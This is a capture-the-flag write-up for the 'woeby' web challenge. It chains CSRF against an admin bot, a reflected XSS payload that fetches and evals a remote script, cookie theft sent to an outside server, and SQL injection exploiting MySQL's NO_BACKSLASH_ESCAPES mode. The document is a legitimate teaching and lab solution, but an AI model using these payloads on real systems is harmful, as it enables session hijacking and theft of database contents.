# Challenge description

## woeby (web, 489 points, 3 solves)

*this retro search engine has retro bugs!*

# Initial reconnaissance

The instancer set up for this challenge directs us to try out our exploit locally first, so we should turn our attention to attachments to the challenge.

Along with the instancer URL, we get a handout in .tar.gz format, which contains a Dockerfile, a bot.js file, and a docker-compose configuration file. The docker-compose configuration file is nothing special and only contains the main docker container as well as a port mapping of port 1337 outside to port 80 inside the container. The bot.js file is a node.js script which makes use of playwright-chromium (a browser automation library) to log into the admin panel, view all submissions awaiting review, open the link pointing to the last one, then, after waiting 5 seconds, submit the review as complete. The interesting part for us is opening the submissions - we can submit any URL we like (with some limitations) and the browser will open it, which means we can immediately, without any exploits, run full javascript on a browser which has an open session to the admin panel, albeit on a different origin.

The Dockerfile also serves as an interesting source of information for us. We are quickly told that

    # note: the build is "standard", and is not important for solving the challenge. there is no (intentional) bug within the build itself
    # relevant changes are marked with !!! comments

so we can concentrate our attention on those parts of the file. The first part marked with `!!!` is as follows:

    # !!! FLAGS ADDED HERE !!!
    mysql -u root wiby -e "create table flag1 (flag text); insert into flag1 values ('$FLAG1'); grant select on flag1 to 'approver'@'localhost';" && \
    mysql -u root wiby -e "create table flag2 (flag text); insert into flag2 values ('$FLAG2'); grant select on flag2 to 'crawler'@'localhost';"

It should be immediately obvious that this is what we need to get - two parts of the flag from two different tables in the database. Since each is readable by a different user, it appears we will need at least two different vulnerabilities to read the whole flag.

The second relevant part is:

    # !!! we add an admin bot to review your submitted urls !!!
    COPY bot.js /tmp/bot.js
    RUN npm i playwright-chromium && \
    printf "\nenv[PLAYWRIGHT_BROWSERS_PATH] = /ms-playwright\nenv[ADMIN_PASSWORD] = $ADMIN_PASSWORD\n" >> /etc/php/7.4/fpm/php-fpm.conf && \
    sed -i 's/\$output.*$/$output = "Thank you for submitting \$url. An admin will review it shortly."; exec("node \/tmp\/bot.js > \/dev\/null 2>\&1 \&");/g' wiby/html/submit/index.php && \

All this does is copy the bot.js file inside the container, set up the environment for running it and make sure it gets run after every submission. This means we can be sure that after every URL submission, the bot will open it immediately.

There is one more interesting line for our experimentation, with it being

    ENV ADMIN_PASSWORD="not_real_admin_password"

While this is not useful for the actual hosted version of the challenge (the password is obviously different), it is a useful thing to note for local recon and experimentation.

Since we have everything we need to run the challenge, we can run docker-compose up and get access to our own instance on port 1337 of localhost. Because this is a search engine, we can also try to search for "flag" and open the first link, to get the outcome that we should obviously expect.

# Looking for vulns

## CSRF and XSRF

By the time I started work on this challenge, there was already a hint in the CTF discord saying that the solution should involve CSRF, XSS and SQLi. Since we can submit arbitrary URLs to the bot to view, it's quite clear that the CSRF vulnerability will be due to this. The browser used is quite modern, and the challenge page itself doesn't set any CORS headers, so we can't just fetch something using the cookies set when the bot logs in and get the response. However, no XSRF protections are used on any forms, and the session cookie has the SameSite attribute set to none, which means we can create a website with a form which automatically uses any endpoint using admin privileges. This means we don't need to solve any CAPTCHA which might normally be present on forms. A simple example of how we can use XSRF to our advantage is as follows:

    <form action="http://127.0.0.1/submit/" method="post"><input name="url" value="http://website.example.com"></input></form>
    <script>document.getElementsByTagName('form')[0].submit()</script>

If a reflected XSS exploit is found on any page, the document above can be used to extend it into a full no-input XSS exploit with code execution on the search engine's origin with full cookie access. Speaking of which:

## XSS

The first obvious XSS vector on the /submit/ page is the URL field itself. Submitting `<script>alert(1);</script>` throws an error saying that this does not look like a valid URL. It looks like we will need to dive into the code, so to start, let's get access to a shell inside the container, this can be done with the command

    docker exec -it woeby-chal-1 bash

Looking at /var/www/html/submit/index.php, we can see that to qualify as a url, the submitted string must include a dot, must not include a space anywhere, and must not be empty, it also should not be more than 400 characters long, else it gets truncated, and if it does not include an http:// or https:// anywhere within itself, http:// is automatically prepended. Any quotes are automatically doubled. If we submit the slightly modified `<script>alert(1.1);</script>http://`, we get an alert with 1.1, meaning this can be used as an easy reflected XSS back into a browser, with some limitations. To remove these, we can fetch() a javascript file and eval() its contents. To do so, we need to be able to specify an address as a string without using quotes. This can be done with regex notation, such as `/172.18.0.1:8000/.toString().substr(1,15)`, which returns '172.18.0.1:8000'. This can be used to form the input `<script>fetch(/http:\/\/172.18.0.1:8000\/script.js/.toString().substr(1,35)).then(res=>res.text()).then(res=>eval(res))</script>http://.`, which downloads script.js from an HTTP server on the host and eval()s it, running arbitrary javascript with the origin of the search engine itself. This requires an HTTP server running on the docker host with CORS set up - I just used a short python script from https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server

From here, we could run any exploits we wanted, but the way I chose to run exploits was interactively. Inside the script.js file, I used `fetch('http://172.18.0.1:8000/pwn?cookie=' + document.cookie)`, which allowed me to get the PHP session cookie for the bot's admin login session from the server request log. From there, we can use a cookie editor extension to set this cookie on our own browser, gaining admin privileges.

## SQL injection

All the accessible websites are visible in /var/www/html/, and we know that the the two parts of the flag need the privileges of the 'approver' and 'crawler' users. We can find all the files that connect to the SQL server as these users using the commands

    grep mysqli_connect.*approver -R /var/www/html | grep -v index.php
    grep mysqli_connect.*crawler -R /var/www/html

which look for mysqli_connect with the users approver and crawler. As the approver user is also used to validate and facilitate logins, we filter out the index.php files which only use the SQL connection for logins. The files left after doing this are as follows:

    root@960ed1d5830b:/tmp# grep mysqli_connect.*approver -R /var/www/html | grep -v index.php
    /var/www/html/accounts/accounts.php:            $link = mysqli_connect('127.0.0.1', 'approver', 'foobar');
    /var/www/html/grave/graveyard.php:      $link = mysqli_connect('127.0.0.1', 'approver', 'foobar');
    /var/www/html/readf/feedback.php:       $link = mysqli_connect('127.0.0.1', 'approver', 'foobar');
    /var/www/html/review/review.php:        $link = mysqli_connect('127.0.0.1', 'approver', 'foobar');
    root@960ed1d5830b:/tmp# grep mysqli_connect.*crawler -R /var/www/html
    /var/www/html/ban/ban.php:              $link = mysqli_connect('127.0.0.1', 'crawler', 'seekout');
    /var/www/html/insert/insert.php:                $link = mysqli_connect('127.0.0.1', 'crawler', 'seekout');
    /var/www/html/tags/tags.php:            $link = mysqli_connect('127.0.0.1', 'crawler', 'seekout');
    root@960ed1d5830b:/tmp#

After looking at all the files, one stands out - specifically, insert.php with the crawler user. To prevent SQL injection, instead of using mysqli_real_escape_string to escape user input, it uses quote duplication:

    //$url = mysqli_real_escape_string($link, $_POST['url']);
    $url = str_replace("\'", "\'\'", $_POST['url']);
    $url = str_replace("\"", "\"\"", $url);

While this is a supported way of escaping quotes in SQL, it is usually also relatively easy to get around by simply adding a backslash and one quote (example: query is `SELECT * FROM table WHERE name = "user-input"`, if we control user-input, we can simply write `\"; STATEMENT; --`, which gets the quotes duplicated, and thus the query becomes `SELECT * FROM table WHERE name = "\""; STATEMENT; --"`, so STATEMENT gets interpreted as an SQL statement). However, if we try to enter the string `\" --` (since the SQL statement, on lines 75-76, uses double quotes to quote strings) as the URL in the form on page /insert/insert.php (logging in as admin:not_real_admin_password for now), which should return an SQL error, we find that we get told there were "No errors", and indeed if we check the database manually with

    mysql wiby -e "SELECT * FROM windex"

we find that the query did indeed go through, and the URL field contains exactly `\" --` - with the double quotes reduced to what we entered, and with the backslash intact. It's almost as if the backslash is not acting as an escape character! What gives?

After some more digging, I found out that there is indeed an option in mysql which allows one to disable using backslashes as escape characters. And after one more look at the Dockerfile, I noticed this on line 48:

    RUN printf '[...] sql_mode = "NO_BACKSLASH_ESCAPES"\n [...]' >> /etc/mysql/my.cnf [...]

So backslashes indeed do not act as escape characters. As far as I can tell, this actually makes escaping using quote doubling perfectly safe - but interestingly, it also activates a special mode in mysqli_real_escape_string, which makes it use quote doubling instead of backslashes to escape quotes. Crucially, however, only single quotes are doubled, so if double quotes are used to escape strings within the SQL statement, mysqli_real_escape_string provides no protection against SQL injection at all in the NO_BACKSLASH_ESCAPES SQL mode, as we can simply use the " char to close any string literal. From here, we can use, for example, the /tags/tags.php script, which executes the query `SELECT tags FROM windex WHERE url = "INPUT";` on line 62. We can simply pass `a" UNION SELECT flag from flag2 WHERE "" = "` as the url POST parameter without passing the tags parameter, which neatly presents us with the second part of the flag in the tags field of the resulting page. To send this request, we can use the following HTML page:

    <form action="http://localhost:1337/tags/tags.php" method="post"><input name="url"></input><input type="submit"></input></form>

Another SQL injection is present on the page /review/review.php, where we can set the startid and endid POST parameters. To send requests, a similar HTML page to the one above can be used:

    <form action="http://localhost:1337/review/review.php" method="post"><input name="startid"></input><input name="endid"></input><input type="submit"></input></form>

If we submit `1` as startid and `2 UNION SELECT flag, flag, flag, flag, flag, flag FROM flag1` as endid (no quotes, as the arguments themselves are not quoted either, and repeating flag six times as the reviewqueue table which is being selected from has six columns), we actually get an SQL error, as the result of the query is not directly visible on the page, but is instead used in another SQL query. This, however, is not actually a problem, since the error contains the first part of our flag, just with the first part (which is always the same - uiuctf) removed. Thus, we can copy the first part of the flag, add the second from the /tags/tags.php page, add uiuctf in the front and we have the fake flag.

# Putting it all together

First, in preparation, we should download a cookie editor extension for the browser we are using. Then, we need to get a server up and running with a public address, so that the real challenge instance can connect to it. From there, we need to upload the script.js file as well as the csrf html document and any server we are using. An example document usable for CSRF is as follows:


    # csrf.html
    <form action="http://127.0.0.1/submit/" method="post"><input name="url" value="<script>fetch(/http:\/\/192.0.2.15:8000\/script.js/.toString().substr(1,35)).then(res=>res.text()).then(res=>eval(res))</script>http://."></input></form>
    <script>document.getElementsByTagName('form')[0].submit()</script>

The script.js file can be as simple as:

    # script.js
    fetch('http://192.0.2.15:8000/pwn?cookie=' + document.cookie)

192.0.2.15 must be replaced with the public IP address of the server, and the second argument of substr() in csrf.html must also be changed if the IP address length changes. After running the server and submitting http://192.0.2.15:8000/csrf.html as a website to index, the admin login cookie lands in the request log of the server. After editing our session cookie to match the one we got, we gain admin privileges on our instance of the search engine.

After this, all that's left to do is replace the URL with the URL of our woeby instance in the following HTML document and submit the inputs from above (`1` as startid and `2 UNION SELECT flag, flag, flag, flag, flag, flag FROM flag1` as endid for the first form, `a" UNION SELECT flag from flag2 WHERE "" = "` as url for the second).

    <form action="http://instance.example.com/review/review.php" method="post"><input name="startid"></input><input name="endid"></input><input type="submit"></input></form>
    <form action="http://instance.example.com/tags/tags.php" method="post"><input name="url"></input><input type="submit"></input></form>

If all went to plan, join the two flag parts, add uiuctf, and we have the complete flag!
    
    uiuctf{cec1e609cef0e05add463c52}
